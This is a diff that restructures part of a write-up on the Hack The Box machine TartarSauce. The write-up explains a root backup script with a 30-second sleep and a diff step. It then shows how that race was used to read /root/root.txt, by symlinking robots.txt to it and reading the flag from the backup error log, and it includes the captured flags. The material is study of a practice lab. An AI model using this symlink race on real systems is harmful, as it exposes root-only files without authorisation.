@@ -219,98 +219,100 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 	1c4c8a145480c441d6bb10c866d967b8
 	```
 
-## Root.txt - Via exploiting backuperer
+## Root.txt - Found Backuperer 
 1. Found something interesting w/ `linpeas.sh`
 	![](Pasted%20image%2020220908011503.png)
 	- `backuperer.service` - similar to a cronjob executing periodically
 	- `backuperer` file 
 2. View contents of `backuperer` file
 	![](Pasted%20image%2020220908011902.png)
-3. What is `backuperer` doing?
-	1. Assign variables 
+
+## Root.txt - What is backuperer doing?
+1. Assign variables 
+	```
+	# Line 11-17
+	basedir=/var/www/html
+	bkpdir=/var/backups
+	tmpdir=/var/tmp
+	testmsg=/var/backups/onuma_backup_test.txt
+	errormsg=/var/backups/onuma_backup_error.txt
+	tmpfile=/var/tmp/.RANDOM
+	check=/var/tmp/check
+	```
+2. Print date of when `backuperer` was last run
+3. Remove `/var/tmp/.RANDOM` and `/var/tmp/check`
+	```
+	# Line 31
+	/bin/rm -rf $tmpdir/.* $check
+	```
+4. Create an archive called `/var/tmp/.RANDOM` from `/var/www/html`, w/ `gzip`
+	```
+	/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
+	```
+5. Sleep for 30 seconds
+	```
+	# Line 38
+	/bin/sleep 30
+	```
+5. Create a directory `/var/tmp/check`
+6. Change directory to `/var/tmp/check`, extract archive from earlier, `/var/tmp/.RANDOM` 
+	```
+	# Line 47
+	/bin/tar -zxvf $tmpfile -C $check
+	```
+7. Compares `/var/www/html` against `/var/tmp/check/var/www/html` 
+8. If the directories are not the same, 
+	1. Append "Integrity Check Error...." AND date of archive (`/var/tmp/.RANDOM`) into `/var/backups/onuma_backup_error.txt`
+	2. Append output of `diff` into `/var/backups/onuma_backup_error.txt`
 		```
-		# Line 11-17
-		basedir=/var/www/html
-		bkpdir=/var/backups
-		tmpdir=/var/tmp
-		testmsg=/var/backups/onuma_backup_test.txt
-		errormsg=/var/backups/onuma_backup_error.txt
-		tmpfile=/var/tmp/.RANDOM
-		check=/var/tmp/check
+		# Line 48-53
+		if [[ $(integrity_chk) ]]
+		then
+			# Report errors so the dev can investigate the issue.
+			/usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
+			integrity_chk >> $errormsg
+			exit 2
 		```
-	2. Print date of when `backuperer` was last run
-	3. Remove `/var/tmp/.RANDOM` and `/var/tmp/check`
+9. If the directories are the same,
+	1. Rename and move file `/var/tmp/.RANDOM` to `/var/backups/onuma-www-dev.bak` 
+	2. AND remove directory `/var/tmp/check`  and `/var/tmp/.RANDOM`
 		```
-		# Line 31
-		/bin/rm -rf $tmpdir/.* $check
+		# Line 54-59
+		else
+			# Clean up and save archive to the bkpdir.
+			/bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
+			/bin/rm -rf $check .*
+			exit 0
+		fi
 		```
-	4. Create an archive called `/var/tmp/.RANDOM` from `/var/www/html`, w/ `gzip`
+1. How do we exploit `backuperer`?
+	- `/usr/bin/diff` - If there is a difference found in the contents of the file, the contents of the specified files will be displayed.
 		```
-		/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
+		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
+		└─# echo "testing1" > test1
+		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
+		└─# echo "testing2" > test2
+		┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
+		└─# diff test1 test2
+		1c1
+		<- testing1
+		---
+		-> testing2
 		```
-	5. Sleep for 30 seconds
-		```
-		# Line 38
-		/bin/sleep 30
-		```
-	5. Create a directory `/var/tmp/check`
-	6. Change directory to `/var/tmp/check`, extract archive from earlier, `/var/tmp/.RANDOM` 
-		```
-		# Line 47
-		/bin/tar -zxvf $tmpfile -C $check
-		```
-	7. Compares `/var/www/html` against `/var/tmp/check/var/www/html` 
-	8. If the directories are not the same, 
-		1. Append "Integrity Check Error...." AND date of archive (`/var/tmp/.RANDOM`) into `/var/backups/onuma_backup_error.txt`
-		2. Append output of `diff` into `/var/backups/onuma_backup_error.txt`
-			```
-			# Line 48-53
-			if [[ $(integrity_chk) ]]
-			then
-			    # Report errors so the dev can investigate the issue.
-			    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
-			    integrity_chk >> $errormsg
-			    exit 2
-			```
-	1. If the directories are the same,
-		1. Rename and move file `/var/tmp/.RANDOM` to `/var/backups/onuma-www-dev.bak` 
-		2. AND remove directory `/var/tmp/check`  and `/var/tmp/.RANDOM`
-			```
-			# Line 54-59
-			else
-				# Clean up and save archive to the bkpdir.
-				/bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
-				/bin/rm -rf $check .*
-				exit 0
-			fi
-			```
-4. Exploiting `backuperer`
-	- How do we exploit it?
-		- `/usr/bin/diff` - If there is a difference found in DIFF, the contents of the specified files will be displayed.
-			```
-			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
-			└─# echo "testing1" > test1
-			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
-			└─# echo "testing2" > test2
-			┌──(root💀kali)-[~/htb/tartarsauce/10.10.10.88/loot/test]
-			└─# diff test1 test2
-			1c1
-			<- testing1
-			---
-			-> testing2
-			```
-		- To exploit this, we have to take advantage of the 30 second sleep and `diff` outputing the contents of the file.
-		- If there is a difference in the content of the archive and `tartarsauce.htb` web directory, the content of the files that are different from each other will be outputed into `/var/backups/onuma_backup_error.txt`
-		
+	- To exploit this, we have to take advantage of the 30 second sleep and `diff` outputing the contents of the file.
+	- If there is a difference in the content of the archive and `tartarsauce.htb` web directory, the content of the files that are different from each other will be outputed into `/var/backups/onuma_backup_error.txt`
+
+
+## Root.txt - Via exploiting backuperer
+1. Exploiting `backuperer`
 	1. Monitor when when `backuperer` is executed
 		```
-		# to sniff processes
-		pspy32
+		pspy32 
+
 		# this is better because u can see the exact timing
 		watch -n 1 'systemctl list-timers'
 		```
-
-	2. Create a backup of `/var/www/html/robots.txt`.
+	2. Create a backup of `/var/www/html/robots.txt`
 		```
 		www-data@TartarSauce:/var/www/html$ cat /var/www/robots.txt
 		User-agent: *
@@ -333,8 +335,8 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 			```
 			www-data@TartarSauce:/var/www/html$ ln -s /root/root.txt robots.txt
 			```
-	7. After 30 seconds, `/usr/bin/diff` is executed, since the content of `robots.txt` in the  archive & the web directory is different, the contents of both the symlink and the actual `robots.txt` is appended into `/var/backups/onuma_backup_error.txt`
-	8. View `/var/backups/onuma_backup_error.txt`, content of `root.txt` resides in it
+	1. After 30 seconds, `/usr/bin/diff` is executed, since the content of `robots.txt` in the  archive & the web directory is different, the contents of both the symlink and the actual `robots.txt` is appended into `/var/backups/onuma_backup_error.txt`
+	2. View `/var/backups/onuma_backup_error.txt`, content of `root.txt` resides in it
 		```
 		www-data@TartarSauce:/var/www$ cat /var/backups/onuma_backup_error.txt | tail -n 1
 		94950492344b54734ea2550b122def59
@@ -359,6 +361,7 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 	</script>
 	</body>
 	</html>
+
 
 # Privilege Escalation - 2
 
@@ -454,5 +457,4 @@ The privilege escalation is really challenging, I learnt that if there is a comp
 	</script>
 	</body>
 	</html>
-
 
